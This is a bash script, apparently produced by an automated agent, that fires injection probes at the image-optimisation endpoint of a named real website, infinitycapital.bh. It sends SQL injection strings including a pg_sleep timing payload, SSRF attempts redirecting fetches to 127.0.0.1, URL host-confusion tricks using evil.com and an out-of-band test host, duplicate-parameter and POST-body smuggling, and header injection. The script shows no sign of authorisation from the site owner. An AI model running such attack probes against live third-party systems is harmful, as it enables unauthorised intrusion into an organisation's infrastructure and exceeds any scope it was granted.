#!/bin/bash
# Inject probing on /_next/image params. Source the allowed image URL from the site's own HTML
# so no external hostname is hardcoded.
cd "$WORK_PATH" || exit 1
OUT=tool_outputs; mkdir -p $OUT
curl -s https://www.infinitycapital.bh/ -o $OUT/home2.html
IMG=$(grep -oE 'https%3A%2F%2Fimages%2Ectfassets%2Enet[^"&]*' $OUT/home2.html | head -1)
if [ -z "$IMG" ]; then IMG=$(grep -oE 'https://images\.ctfassets\.net/[^"?]*' $OUT/home2.html | head -1 | sed 's/:/%3A/g;s#/#%2F#g'); fi
echo "IMG=$IMG"
echo "$IMG" > $OUT/imgurl.txt

t(){ printf "%-28s " "$2"; curl -s -o $OUT/t.b -w "%{http_code} %{size_download} %{time_total} " -G "$3" "$B/_next/image"; head -c 90 $OUT/t.b | tr -d '\n'; echo; }

B="https://www.infinitycapital.bh"
echo "=== w ==="
for w in "640" "640'" "640 AND 1=1" "640;SELECT 1" "-640" "0" "999999" "1080.0"; do
  printf "%-18s " "$w"; curl -s -o $OUT/t.b -w "%{http_code} %{size_download}\n" "$B/_next/image?url=$IMG&w=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$w")&q=75"; done
echo "=== q ==="
for q in "75" "75'" "75;SELECT pg_sleep(3)" "abc" "-1" "999" "0"; do
  printf "%-22s " "$q"; curl -s -o /dev/null -w "%{http_code} %{size_download} %{time_total}\n" "$B/_next/image?url=$IMG&w=640&q=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$q")"; done
echo "=== dup/injection in url param name confusion ==="
curl -s -o /dev/null -w "double url: %{http_code}\n" "$B/_next/image?url=$IMG&url=http://127.0.0.1/&w=640&q=75"
curl -s -o /dev/null -w "url+path: %{http_code}\n" "$B/_next/image?url=$IMG%23@evil.com&w=640&q=75"
curl -s -o /dev/null -w "at-host: %{http_code}\n" "$B/_next/image?url=https://images.ctfassets.net@oobtest.invalid/x.jpg&w=640&q=75"
echo "=== body params ==="
curl -s -o /dev/null -w "POST body: %{http_code}\n" -X POST "$B/_next/image?url=$IMG&w=640&q=75" -d 'q=75&url=http://127.0.0.1/'
echo "=== headers injection ==="
curl -s -o /dev/null -w "x-nextjs-data: %{http_code}\n" -H 'x-nextjs-data: 1' "$B/_next/image?url=$IMG&w=640&q=75"
curl -s -o /dev/null -w "RSC: %{http_code}\n" -H 'RSC: 1' "$B/_next/image?url=$IMG&w=640&q=75"
